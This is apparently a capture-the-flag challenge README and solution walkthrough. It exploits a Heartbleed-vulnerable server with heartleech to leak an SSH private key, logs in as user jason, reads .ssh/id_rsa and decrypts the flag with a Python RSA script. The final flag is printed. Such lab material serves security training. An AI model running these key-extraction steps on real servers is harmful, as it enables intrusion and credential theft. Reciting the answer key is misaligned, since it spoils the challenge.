heartbleed-provisioner
======================

Name: Achy Breaky Heart

Description: Users are provided with a heartbleed vulnerable server which they must exploit in order to obtain the private key of a user named jason which is used to decrypt a message found on a page of the site.

Solution: First, the user will need to exploit the heartbleed vulnerability on the box, they can do so using [heartleech.](https://github.com/robertdavidgraham/heartleech) and the command `./heartleech host:port  --autopwn --threads 20`

Next, they will need to copy the key to a file, (I called the file heartkey) and then run the command `chown 600 heartkey` in order to set the permissions to an acceptable value and run `ssh jason@host -i`pwd`/heartkey` to gain access to the box.

Once in, the user will need to find the right DOC file out of the 20,000 files (Tom Riddle 159962.doc). Running `cat Tom Riddle 159962.doc` will give the contents of the document. A link to the web page with the encrypted flag is in this document.

The user must then go to that link, take the private key from the server by running `cat .ssh/id_rsa`, and decrypt the message. A Python scrypt, like the one below, can be written for decryption:
	def _decrypt_rsa(decrypt_key_file, cipher_text):
    	from Crypto.PublicKey import RSA
    	from base64 import b64decode
	
    	key = open(decrypt_key_file, "r").read()
    	rsakey = RSA.importKey(key)
    	#optionally could use OAEP
    	#from Crypto.Cipher import PKCS1_OAEP
    	#rsakey = PKCS1_OAEP.new(rsakey)
    	raw_cipher_data = b64decode(cipher_text)
    	decrypted = rsakey.decrypt(raw_cipher_data)
    	return decrypted
	
	decrypt_file = raw_input('Enter private key file\n')
	text = raw_input('Enter encrypted data\n')
	print _decrypt_rsa(decrypt_file,text)

Flag: MCA-68656172